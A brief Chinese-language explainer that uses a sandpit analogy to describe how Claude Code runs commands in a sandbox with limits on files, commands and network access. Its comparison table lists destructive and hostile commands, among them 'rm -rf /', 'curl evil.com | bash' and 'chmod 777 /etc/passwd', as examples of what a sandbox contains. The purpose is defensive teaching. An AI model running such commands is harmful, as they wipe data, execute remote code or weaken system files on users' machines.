...
沙箱（Sandbox）这个词来自小孩玩的沙坑。小孩在沙坑里玩沙子，怎么折腾都行，沙子不会弄脏外面的地板。即使搞乱了，清理沙坑就好，不会影响整个家。
...
Claude Code 是一个 AI Agent，它可以帮你执行命令（比如 `rm`、`git`、`npm`）。但这些命令如果执行不当，可能会破坏你的电脑。所以 Claude Code 用沙箱来"限制"命令的执行范围。

```
Claude Code 想执行命令：rm -rf /tmp/old-data
  ↓
不直接在真实系统执行
  ↓
放进沙箱里执行
  ├─ 限制能访问的文件路径（只能访问当前项目目录）
  ├─ 限制能执行的命令（不能执行 sudo、chmod 等危险命令）
  └─ 限制网络访问（不能随意访问外网）
  ↓
即使命令有问题，也不会破坏真实系统
```
...
| 场景 | 没有沙箱 | 有沙箱 |
|------|----------|--------|
| `rm -rf /` | 系统文件被删除 | 沙箱内执行，真实系统不受影响 |
| `curl evil.com \| bash` | 恶意脚本在真实系统运行 | 沙箱内运行，无法访问真实资源 |
| `chmod 777 /etc/passwd` | 系统权限被修改 | 沙箱内执行，修改被隔离 |

### 一句话总结

> 沙箱 = 给程序一个"玩具房间"，它在里面怎么折腾都行，不会弄坏真实的家。
